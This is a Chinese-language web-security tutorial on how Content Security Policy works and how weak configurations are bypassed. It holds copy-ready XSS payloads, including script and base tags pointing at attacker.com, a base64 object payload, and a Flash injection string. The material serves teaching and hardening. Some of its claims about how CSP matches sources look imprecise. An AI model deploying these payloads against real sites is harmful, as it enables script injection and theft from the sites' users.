---
title: "常见 CSP 配置要点与可用绕过"
description: "CSP（内容安全策略）的工作原理、常用指令与配置要点，以及常见的绕过方式。"
publishDate: "2026-08-20T00:00:00+08:00"
tags: ["web", "csp"]
---
# 常见 CSP 配置要点与可用绕过

## 什么是CSP

CSP（Content Security Policy，内容安全策略），是网页应用中常见的一种安全保护机制，通过安全策略的设置来决定外部来源引入的脚本、图片、框架是否能够在当前页面中被调用或执行，CSP可以通过响应包头或HTML中的元标签中的某些字段来实现，CSP是一种浏览器响应策略。



**CSP HTTP 头格式如下：**

```bash
Content-Security-Policy: 指令1 参数1; 指令2 参数2; ...
```

**通过HTML 元标签实现：**

```text
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```

### 指令值

`default-src` 是所有资源类型的默认源。如果没有为某种特定的资源类型指定单独的策略，它会继承 `default-src` 的设置。

`script-src` 用于控制 JavaScript 脚本的加载源，防止 XSS 攻击。



### 参数值

```yaml
*： 星号表示允许任何URL资源，没有限制；
self： 表示仅允许来自同源（相同协议、相同域名、相同端口）的资源被页面加载；
data：仅允许数据模式（如Base64编码的图片）方式加载资源；
none：不允许任何资源被加载；
unsafe-inline：允许使用内联资源，例如内联<script>标签，内联事件处理器，内联<style>标签等，但出于安全考虑，不建议使用；
nonce：通过使用一次性加密字符来定义可以执行的内联js脚本，服务端生成一次性加密字符并且只能使用一次；
```

## 示例：

参考自@[CSP常见配置及绕过姿势](https://www.freebuf.com/articles/web/260535.html)

### Scene 1

```xml
Content-Security-Policy: script-src 'self' https://sina.com https://baidu.com https: data *; child-src 'none'; report-uri /Report-parsing-url;
```

CSP 在解析 `script-src` 指令时，遵循“首次匹配有效”或“最宽松策略覆盖”的逻辑。这里涉及三个关键规则的叠加效应：

- `https:`：这表示允许任何使用 HTTPS 协议加载的脚本，无论域名是什么（等同于白名单全通）。

- `*`：这表示允许任何协议（HTTP/HTTPS/FTP 等）从任何域名加载脚本。

- `data:`：这表示允许通过 `data:` URI 协议直接内联执行编码后的 JavaScript 字符串。

当浏览器解析到 `*` 时，它会生成一个允许列表 `http://`*`:`* 和 `https://`*`:`*。覆盖前面的 `'self'` 和具体域名白名单（sina/baidu）。



```xml
Payload:"/>'><script src=https://attacker.com/evil.js></script>"/>'><script src=data:text/javascript,alert(1337)></script>
```

`"/>'` 是为了闭合前端代码中可能存在的引号或尖括号。

1. `"` 闭合 `value` 属性。

2. `>` 闭合当前的 `<input>` 标签。

3. `'` 用于处理单引号边界情况，确保后续内容被解析为独立的 HTML 标签。



### Scene 2

```xml
Content-Security-Policy：script-src ‘self’ report-uri /Report-parsing-url;
```

缺少 `default-src` 和 `object-src`

- **CSP 回退机制**

浏览器在处理对象/插件（`<object>`、`<embed>`）时，会按以下顺序查找策略：`object-src` ➡️ `default-src` ➡️ 默认值（即 `*` 允许所有）。

```xml
payloads: <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'> <param name="AllowScriptAccess" value="always"></object>
```



第二个payload是Flash 的 `ExternalInterface` 注入（CVE\-2010\-4207），

一个来自官方CDN的、看似合法的SWF文件，在加载时，会因为一个恶意参数，在其内部执行了经过巧妙“拼接”的恶意代码，并最终将攻击者的JavaScript注入到你的网页中。



第三部分`AllowScriptAccess="always"` 开启桥梁
`<param name="AllowScriptAccess" value="always">` 告诉 Flash 播放器，该 SWF 文件可以无限制地调用宿主页面的 JavaScript（即 `ExternalInterface.call` 接口）。如果该值为 `none`，即使注入成功也无法执行 JS。



### Scene 3

网站设置了 `default-src 'none'`（即禁止加载任何图片、脚本、AJAX 等）或者 `default-src 'self'`，但攻击者找到了 XSS 注入点。**若未设 navigate\-to，仍可整页跳转（location\.href、\<meta http\-equiv=refresh\>）。**

这里有一个点需要注意：

`default-src 'self'` 中的 `'self'` 限定的是获取子资源时的主机名，而对 `location.href` 赋值时，浏览器根本不查询 `default-src` 的值。因此，即使 `default-src` 设得再严格，攻击者依然可以执行 `location.href = "``https://google.com``"`。



如果设置了`navigate-to 'self'`，这能跳转同源页面。



### Scene 4

script\-src 'nonce\-\<rand\>'：用随机 nonce 放行“受信脚本”（可用于内联与外链脚本标签）'，strict\-dynamic' 使“受信脚本动态创建的脚本”自动受信，忽略域白名单。

注入 `<base>` 劫持“带 Nonce 的相对脚本标签”

这是最精妙的一招，它利用了浏览器解析 URL 的时机与 CSP 检查时机之间的“时间差”。

攻击链拆解：

假设原始页面有如下合法的带 Nonce 脚本标签（由开发者写入）：

```text
<script nonce="abc123" src="/static/app.js"></script>
```



此时，因为 `src` 是相对路径 `/static/app.js`，CSP 默认将其补全为 `https://合法域名.com/static/app.js`，通过检查。

攻击者注入：

```text
<base href="https://attacker.com/">
```

随后，浏览器在解析文档流时，重新计算所有相对 URL 的基准地址（Base URL）。于是，那个原本指向同源的 `<script>` 标签，其实际请求目标变成了：
`https://attacker.com/static/app.js`



这里要分两种情况：

- 如果没有 `strict-dynamic`：浏览器发起请求时，CSP 会检查目标 URL `attacker.com` 是否在白名单中。如果白名单只有 `'self'`，会被拦截。

- 如果配置了 `strict-dynamic`：`strict-dynamic` 的核心作用是：只要脚本标签带有正确的 Nonce，浏览器就完全忽略域名白名单（`'self'` 和所有 `https://xxx.com`）。因此，浏览器一看标签有正确的 Nonce，直接放行，下载并执行 `attacker.com` 的恶意脚本。

结论：`<base>` \+ `strict-dynamic` 的组合，让攻击者通过改变“物理地址”偷换了“受信标签”指向的资源。



## Reference：

https://www\.freebuf\.com/articles/web/260535\.html \#精读

https://blog\.csdn\.net/jkzyx123/article/details/142457303

https://github\.com/cure53/XSSChallengeWiki/wiki

